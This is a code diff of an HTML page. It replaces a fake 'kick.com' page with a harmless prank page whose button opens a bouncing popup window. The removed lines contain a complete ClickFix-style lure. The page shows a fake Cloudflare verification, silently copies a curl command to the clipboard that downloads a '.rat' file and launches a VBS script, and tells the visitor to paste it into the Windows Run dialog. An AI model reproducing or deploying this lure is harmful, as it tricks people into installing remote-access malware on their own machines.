@@ -3,178 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>kick.com</title>
+    <title>Prank Website</title>
     <style>
-        /* Reset default margin and padding */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: white;
-            color: black;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
-            height: 100vh; /* Full viewport height */
-            position: relative;
-            overflow: hidden;
-        }
-
-        h1 {
-            font-size: 48px;
-            font-weight: normal;
-            margin-bottom: 10px;
-        }
-
-        p {
-            font-size: 18px;
-            margin-bottom: 20px;
-        }
-
-        .footer {
-            position: fixed;
-            bottom: 10px;
-            font-size: 14px;
-            color: gray;
-        }
-
-        .click-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 5; /* Above everything */
-            cursor: pointer;
-        }
-
-        /* Popup Styles */
-        .popup-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 10;
-        }
-
-        .popup {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
-            text-align: center;
-            width: 90%;
-            max-width: 500px;
-            border: 1px solid #ddd;
-        }
-
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            border-top: 4px solid #00bcd4;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .loading-text {
-            font-size: 18px;
-            font-weight: bold;
-            margin-top: 10px;
-            color: black;
-        }
-
-        .instructions {
-            margin-top: 20px;
-            font-size: 16px;
-            text-align: left;
-            color: black;
-        }
-
-        .instructions p {
-            margin: 10px 0;
-        }
-
-        iframe {
-            width: 100vw;
             height: 100vh;
+            background-color: #f4f4f4;
+        }
+        button {
+            font-size: 20px;
+            padding: 15px;
+            cursor: pointer;
+            background-color: red;
+            color: white;
             border: none;
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
-
-    <div class="click-overlay" id="click-overlay"></div>
-
-    <iframe src="https://kick.br.com" id="kick-iframe" title="kick.br.com"></iframe>
-
-    <div class="popup-overlay" id="popup-overlay">
-        <div class="popup" id="popup">
-            <div class="spinner" id="spinner"></div>
-            <p class="loading-text" id="loading-text">Please wait while Cloudflare validates your connection...</p>
-        </div>
-    </div>
-
-    <div class="footer"></div>
-
+    <button onclick="startPrank()">Click Me!</button>
+    
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const clickOverlay = document.getElementById("click-overlay");
-            const popupOverlay = document.getElementById("popup-overlay");
-            const popup = document.getElementById("popup");
-            const loadingText = document.getElementById("loading-text");
-            const spinner = document.getElementById("spinner");
-
-            // When the user clicks anywhere on the page
-            clickOverlay.addEventListener("click", function() {
-                // Show the popup
-                popupOverlay.style.display = "flex";
-
-                // Simulate the action by hiding the spinner and changing the loading text
-                setTimeout(() => {
-                    spinner.style.display = "none"; // Hide spinner
-                    loadingText.textContent = "Extra Verification Needed";
-
-                    // Copy the text to the clipboard
-                    const textToCopy = `cmd /c curl.exe -k -Ss "downloadlink" -o "%USERPROFILE%\\download.rat" && start "" "%USERPROFILE%\\12312312.vbs" By pressing OK you confirm you are not a robot.`;
-                    navigator.clipboard.writeText(textToCopy)
-                        .then(() => {
-                            // Clipboard successfully written, no notification
-                        })
-                        .catch(err => {
-                            console.error('Error copying text: ', err);
-                        });
-
-                    // Add some instructions to the popup
-                    popup.innerHTML += ` 
-                        <div class="instructions">
-                            <p>To proceed, please follow the steps below:</p>
-                            <p>1. Press <b>Windows + R</b> to open the Run dialog.</p>
-                            <p>2. Paste the verification text by pressing <b>CTRL + V.</b></p>
-                            <p>3. Press OK to verify you're not a robot.</p>
-                        </div>
-                    `;
-                }, 3000); // Simulate delay before showing extra verification steps
-            });
-        });
+        function startPrank() {
+            let prankWindow = window.open("", "", "width=200,height=100");
+            prankWindow.document.write("<h1 style='text-align:center;'>You got pranked!!!</h1>");
+            let x = 100, y = 100;
+            let dx = 10, dy = 10;
+            
+            function moveWindow() {
+                if (prankWindow.closed) return;
+                x += dx;
+                y += dy;
+                if (x <= 0 || x >= screen.width - 200) dx = -dx;
+                if (y <= 0 || y >= screen.height - 100) dy = -dy;
+                prankWindow.moveTo(x, y);
+                setTimeout(moveWindow, 50);
+            }
+            moveWindow();
+        }
     </script>
-
 </body>
 </html>
